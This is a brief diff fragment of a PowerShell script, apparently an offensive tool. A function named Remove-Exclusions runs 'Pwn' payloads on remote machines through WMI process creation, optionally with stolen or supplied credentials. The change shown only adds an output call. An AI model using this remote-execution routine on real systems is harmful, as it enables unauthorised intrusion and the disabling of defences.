@@ -187,7 +187,7 @@ function Remove-Exclusions {
         if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
         Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
         if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }}
-        if($user) { Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn1 2>&1> $null
+        if($user) { Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn1 2>&1> $null ; Write-Host
         if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
         Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
         if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
